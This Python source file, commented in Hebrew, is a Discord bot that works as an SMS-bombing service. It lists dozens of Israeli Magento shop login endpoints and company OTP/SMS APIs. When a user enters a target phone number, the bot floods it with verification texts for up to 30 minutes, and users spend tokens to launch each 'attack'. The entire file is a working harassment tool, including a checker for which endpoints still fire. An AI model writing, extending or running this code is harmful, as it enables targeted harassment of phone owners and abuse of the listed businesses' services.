import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json

logging.basicConfig(level=logging.INFO)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== MAGENTO CLUSTER (הכי חזק) ==========
MAGENTO_SITES = [
    "https://www.castro.com/customer/ajax/post/",
    "https://www.hoodies.co.il/customer/ajax/post/",
    "https://www.urbanica-wh.com/customer/ajax/post/",
    "https://www.crazyline.com/customer/ajax/post/",
    "https://www.onot.co.il/customer/ajax/post/",
    "https://www.timberland.co.il/customer/ajax/post/",
    "https://www.adikastyle.com/customer/ajax/post/",
    "https://www.weshoes.co.il/customer/ajax/post/",
    "https://www.ninewest.co.il/customer/ajax/post/",
    "https://www.fixunderwear.com/customer/ajax/post/",
    "https://www.intima-il.co.il/customer/ajax/post/",
    "https://www.gali.co.il/customer/ajax/post/",
    "https://www.golf-il.co.il/customer/ajax/post/",
    "https://www.kiwi-kids.co.il/customer/ajax/post/",
    "https://www.delta.co.il/customer/ajax/post/",
    "https://www.storyonline.co.il/customer/ajax/post/",
    "https://www.nautica.co.il/customer/ajax/post/",
    "https://www.lee-cooper.co.il/customer/ajax/post/",
    "https://www.shoesmarket.co.il/customer/ajax/post/",
    "https://www.tamman.co.il/customer/ajax/post/",
    "https://www.moda-child.co.il/customer/ajax/post/",
    "https://www.yangogo.co.il/customer/ajax/post/",
    "https://www.kapara.co.il/customer/ajax/post/",
    "https://www.bellababy.co.il/customer/ajax/post/",
    "https://www.pashosh.co.il/customer/ajax/post/",
    "https://www.sportwear.co.il/customer/ajax/post/",
    "https://www.running.co.il/customer/ajax/post/",
    "https://www.urbanplace.co.il/customer/ajax/post/",
    "https://www.american-vintage.co.il/customer/ajax/post/",
    "https://www.lacoste.co.il/customer/ajax/post/",
    "https://www.tommyhilfiger.co.il/customer/ajax/post/",
    "https://www.calvinklein.co.il/customer/ajax/post/",
    "https://www.underarmour.co.il/customer/ajax/post/",
    "https://www.skechers.co.il/customer/ajax/post/",
    "https://www.columbia.co.il/customer/ajax/post/",
    "https://www.merrell.co.il/customer/ajax/post/",
    "https://www.nike.co.il/customer/ajax/post/",
    "https://www.adidas.co.il/customer/ajax/post/",
    "https://www.puma.co.il/customer/ajax/post/",
    "https://www.newbalance.co.il/customer/ajax/post/",
    "https://www.converse.co.il/customer/ajax/post/",
    "https://www.vans.co.il/customer/ajax/post/",
    "https://www.asics.co.il/customer/ajax/post/",
    "https://www.reebok.co.il/customer/ajax/post/",
    "https://www.musings.co.il/customer/ajax/post/",
    "https://www.buyme.co.il/customer/ajax/post/",
    "https://www.accessorize.co.il/customer/ajax/post/",
    "https://www.mango.co.il/customer/ajax/post/",
    "https://www.zara.co.il/customer/ajax/post/",
    "https://www.hm.co.il/customer/ajax/post/",
    "https://www.bershka.co.il/customer/ajax/post/",
    "https://www.pullandbear.co.il/customer/ajax/post/",
    "https://www.stradivarius.co.il/customer/ajax/post/",
    "https://www.oysho.co.il/customer/ajax/post/",
    "https://www.massimodutti.co.il/customer/ajax/post/",
]

# ========== ISRAELI APIS (המון APIs ישראלים) ==========
ISRAELI_APIS = [
    # אוכל
    {
        "name": "10bis",
        "url": "https://www.10bis.co.il/api/register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Dominos",
        "url": "https://www.dominos.co.il/api/auth/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "McDonalds",
        "url": "https://www.mcdonalds.co.il/api/verify",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "BurgerKing",
        "url": "https://www.burgerking.co.il/api/auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "KFC",
        "url": "https://www.kfc.co.il/api/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "PizzaHut",
        "url": "https://www.pizza-hut.co.il/api/register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "BurgerAnch",
        "url": "https://app.burgeranch.co.il/_a/aff_otp_auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "data": "phone=PHONE",
        "is_form": True
    },
    {
        "name": "Agva",
        "url": "https://www.agva.co.il/api/auth/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    
    # קניות
    {
        "name": "Shufersal",
        "url": "https://www.shufersal.co.il/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE_RAW"}
    },
    {
        "name": "RamiLevi",
        "url": "https://www.rami-levy.co.il/api/auth/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Victory",
        "url": "https://www.victory.co.il/api/auth/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "SuperPharm",
        "url": "https://www.super-pharm.co.il/api/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "GoodPharm",
        "url": "https://www.goodpharm.co.il/api/auth/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Ivory",
        "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
        },
        "is_get": True
    },
    
    # תחבורה
    {
        "name": "Pango",
        "url": "https://api.pango.co.il/auth/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phoneNumber": "PHONE_RAW"}
    },
    {
        "name": "Gett",
        "url": "https://www.gett.com/il/api/verify",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Hopon",
        "url": "https://api.hopon.co.il/v0.15/1/isr/users",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}
    },
    {
        "name": "Moovit",
        "url": "https://moovit.com/api/auth/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    
    # סלולר ותקשורת
    {
        "name": "Cellcom",
        "url": "https://www.cellcom.co.il/api/auth/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Partner",
        "url": "https://www.partner.co.il/api/register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Pelephone",
        "url": "https://www.pelephone.co.il/api/auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Hot",
        "url": "https://www.hotmobile.co.il/api/verify",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "019",
        "url": "https://019sms.co.il/api/register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    
    # שירותים
    {
        "name": "Yad2",
        "url": "https://www.yad2.co.il/api/auth/register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE", "action": "send_sms"}
    },
    {
        "name": "Wolt",
        "url": "https://www.wolt.com/api/v1/verify",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "PayBox",
        "url": "https://payboxapp.com/api/auth/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Hamal",
        "url": "https://users-auth.hamal.co.il/auth/send-auth-code",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"value": "PHONE", "type": "phone", "projectId": "1"}
    },
    {
        "name": "Mishloha",
        "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phoneNumber": "PHONE"}
    },
    {
        "name": "Zap",
        "url": "https://www.zap.co.il/api/auth/sms",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
    {
        "name": "Bezeq",
        "url": "https://www.bezeq.co.il/api/auth",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        },
        "data": {"phone": "PHONE"}
    },
]

# ========== פונקציות שליחה ==========
async def fast_magento_shot(session, url, phone_raw):
    """ירייה מהירה למג'נטו"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=3) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def fast_api_shot(session, api, phone, phone_raw):
    """ירייה מהירה ל-API ישראלי"""
    try:
        if api.get("is_get", False):
            url = api["url"].replace("PHONE", phone)
            async with session.get(url, headers=api["headers"], timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
        elif api.get("is_form", False):
            url = api["url"]
            data = api["data"].replace("PHONE", phone)
            async with session.post(url, data=data, headers=api["headers"], timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
        else:
            url = api["url"]
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data = json.loads(data_str)
            async with session.post(url, json=data, headers=api["headers"], timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== פונקציית בדיקת APIs (זו שנקראת מהכפתור) ==========
async def check_apis_function(interaction: discord.Interaction):
    """פונקציית בדיקה שנקראת מהכפתור"""
    
    await interaction.response.send_message("🔍 מתחיל בדיקה מקיפה...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    working = []
    failed = []
    
    # בדיקת מג'נטו (רק 10 ראשונים כדי לא להעמיס)
    await interaction.followup.send("🔄 בודק מג'נטו...", ephemeral=True)
    
    async with aiohttp.ClientSession() as session:
        for url in MAGENTO_SITES[:15]:  # רק 15 ראשונים
            site_name = url.split("//")[1].split(".")[0]
            success = await fast_magento_shot(session, url, test_raw)
            
            if success:
                working.append(f"✅ {site_name}")
            else:
                failed.append(f"❌ {site_name}")
            
            await asyncio.sleep(0.2)
    
    # בדיקת APIs ישראלים
    await interaction.followup.send("🔄 בודק APIs ישראלים...", ephemeral=True)
    
    async with aiohttp.ClientSession() as session:
        for api in ISRAELI_APIS[:15]:  # רק 15 ראשונים
            success = await fast_api_shot(session, api, test_phone, test_raw)
            
            if success:
                working.append(f"✅ {api['name']}")
            else:
                failed.append(f"❌ {api['name']}")
            
            await asyncio.sleep(0.2)
    
    # דוח
    report = f"**📊 תוצאות בדיקה**\n\n"
    report += f"**עובדים ({len(working)}):**\n"
    report += "\n".join(working[:20])
    
    if len(working) > 20:
        report += f"\n... ועוד {len(working)-20}"
    
    report += f"\n\n**לא עובדים ({len(failed)}):**\n"
    report += "\n".join(failed[:10])
    
    report += f"\n\n**סה\"כ:** {len(working)} עובדים מתוך {len(working)+len(failed)}"
    
    await interaction.followup.send(report, ephemeral=True)

# ========== פקודת בדיקה (לגישה מהירה) ==========
@bot.tree.command(name="check_api", description="בדוק אילו APIs עובדים")
async def check_api_command(interaction: discord.Interaction):
    """פקודת בדיקה"""
    await check_apis_function(interaction)

# ========== מתקפה ==========
async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
    """הרצת מתקפה"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    running = True
    
    # עדכון ראשוני
    await interaction.followup.send(
        f"⚡ **מתקפה הופעלה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"🎯 מג'נטו: {len(MAGENTO_SITES)}\n"
        f"📡 APIs: {len(ISRAELI_APIS)}",
        ephemeral=True
    )
    
    logging.info(f"⚡ Attack started - ID: {attack_id}, Phone: {phone}")
    
    # 3 סשנים במקביל
    sessions = [aiohttp.ClientSession() for _ in range(3)]
    
    try:
        while running and datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                running = False
                break
            
            rounds += 1
            round_tasks = []
            
            # שליחה למג'נטו
            for session in sessions:
                for url in MAGENTO_SITES:
                    round_tasks.append(fast_magento_shot(session, url, phone_raw))
            
            # שליחה ל-APIs ישראלים
            for session in sessions:
                for api in ISRAELI_APIS:
                    round_tasks.append(fast_api_shot(session, api, phone, phone_raw))
            
            results = await asyncio.gather(*round_tasks, return_exceptions=True)
            round_success = sum(1 for r in results if r is True)
            total_sent += round_success
            
            if rounds % 30 == 0:
                minutes_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds // 60
                rate = total_sent // (minutes_passed + 1)
                
                try:
                    await interaction.followup.send(
                        f"📊 **{minutes_passed} דקות**: {total_sent} הודעות ({rate}/שניה)",
                        ephemeral=True
                    )
                except:
                    pass
            
            await asyncio.sleep(1)
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    reason = "הופסקה" if not running else "הסתיימה"
    try:
        await interaction.followup.send(
            f"✅ **המתקפה {reason}!**\n📊 סה\"כ {total_sent} הודעות",
            ephemeral=True
        )
    except:
        pass
    
    logging.info(f"✅ Attack {attack_id} completed - Total: {total_sent}")

# ========== פקודת עצירה ==========
@bot.tree.command(name="stop", description="עצור את כל המתקפות")
async def stop_attacks(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_attacks = []
    
    for attack_id, status in bot.active_attacks.items():
        if attack_id.startswith(user_id):
            user_attacks.append(attack_id)
    
    if not user_attacks:
        await interaction.response.send_message("❌ אין מתקפות פעילות", ephemeral=True)
        return
    
    for attack_id in user_attacks:
        bot.active_attacks[attack_id] = False
    
    await interaction.response.send_message(f"🛑 עצרתי {len(user_attacks)} מתקפות", ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
    phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ משך בדקות", default="5", placeholder="1-30")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ משך חייב להיות 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 20})
            user_doc = {"tokens": 20}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"🚀 **מתקפה הופעלה!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(run_attack(phone, duration, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_apis_function(interaction)  # קורא לפונקציה, לא לפקודה
    
    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_attacks(interaction)

@bot.tree.command(name="setup", description="פתח פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 25})
        tokens = 25
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="⚡ OMNI TOTAL WAR - ULTIMATE",
        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ISRAELI_APIS)}** APIs ישראלים",
        color=0x00ff00
    )
    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 מתקפות פעילות", value=active, inline=True)
    
    view = MainView()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    await interaction.response.send_message(f"💎 **הטוקנים שלך:** {tokens}", ephemeral=True)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR ULTIMATE...")
    bot.run(TOKEN)
